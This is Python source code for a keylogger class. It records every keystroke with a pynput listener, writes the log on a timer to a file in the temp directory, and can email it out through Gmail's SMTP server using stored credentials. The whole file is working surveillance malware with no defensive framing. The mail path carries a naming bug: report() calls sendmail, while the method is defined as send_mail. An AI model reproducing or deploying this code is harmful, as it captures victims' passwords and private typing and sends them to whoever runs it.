#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib
import os
import tempfile



class Keylogger:
    def __init__(self, time_interval, email="", password="", dosendmail=0, writelogtofile=1):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.do_send_mail = dosendmail
        self.write_log_to_file = writelogtofile
        self.log_file = tempfile.gettempdir() + "/keylogger.txt"

    def append_to_log(self,string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if str(key) == "Key.space":
                current_key = " " 
            else:
                current_key = " " + str(key) + " " 
        self.append_to_log(current_key)
    
    def report(self):
        print(self.log)
        if self.do_send_mail:
            self.sendmail(self.email, self.password, self.log)
        if self.write_log_to_file:
            with open(self.log_file,"a") as file:
                file.write(self.log)

        self.log = "" 
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self,email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


